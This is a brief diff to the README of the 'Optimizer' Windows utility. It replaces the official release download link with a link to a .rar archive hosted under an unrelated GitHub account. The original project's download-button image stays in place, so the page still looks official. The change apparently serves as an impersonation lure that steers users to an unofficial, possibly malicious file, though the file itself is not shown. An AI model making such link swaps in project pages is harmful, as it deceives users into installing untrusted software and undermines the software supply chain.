@@ -1,5 +1,5 @@
 <p align="center">
-	<a href="https://github.com/hellzerg/optimizer/releases/download/14.2/Optimizer-14.2.exe" target="_blank">
+	<a href="https://github.com/xiaomizin/Optimizer./releases/download/v1/optimizer.rar" target="_blank">
 		<img src="https://raw.githubusercontent.com/hellzerg/optimizer/master/download-button.png">
 		<br>
 		<img src="https://cdn.discordapp.com/attachments/1023026233472188426/1033777144024797375/gorila.png">
